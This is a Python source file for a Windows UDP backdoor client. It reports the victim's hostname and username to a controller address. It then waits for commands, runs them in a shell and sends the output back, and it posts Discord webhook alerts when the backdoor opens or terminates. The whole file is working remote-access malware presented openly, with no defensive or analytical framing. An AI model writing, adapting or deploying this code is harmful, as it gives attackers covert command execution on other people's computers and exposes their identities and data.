import os, socket, subprocess, time

from dhooks import Webhook

import win32api
import win32con
import win32event
import win32console

webhook_url = "" # optional: notify via a discord webhook when backdoors open/close
webhook = Webhook(webhook_url)

version = "1.0"

host = "10.0.0.1" # should be public ip, but i cant port forward so ive got to use this
port = 12345
address = (host, port)

client_name = socket.gethostname() + " > " + os.getenv("username")
notif = "client " + client_name

def send_webhook_msg(msg, error_msg):
    try: webhook.send(msg)
    except: print(error_msg)

send_webhook_msg("**" + client_name + "**\n```Backdoor opened (UDP v" + version + ").```", "Could not send notification")

def console_ctrl_handler(ctrl_type):
    if ctrl_type == win32con.CTRL_LOGOFF_EVENT or ctrl_type == win32con.CTRL_SHUTDOWN_EVENT:
        send_webhook_msg("**" + client_name + "**\n```Backdoor terminated (UDP v" + version + ") - user shut down or logged off.```", "Could not send notification")
        return True
    
    return False

win32api.SetConsoleCtrlHandler(console_ctrl_handler, True)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)

def standby():
    print("Waiting for server command")
    data, address = s.recvfrom(1024)

    data = data.decode("utf-8")

    print(data)

    if not data: return
    if data == "exit": return

    proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()

    s.sendto(stdout_value, address)

last_notif = time.time()

while True:
    last_notif = time.time()
    print("Notifying server")
    s.sendto(notif.encode("utf-8"), address)

    try: standby()
    except: print("Wait ended")

    now = time.time()
    _time = now - last_notif

    time.sleep(max(0, 5 - _time))
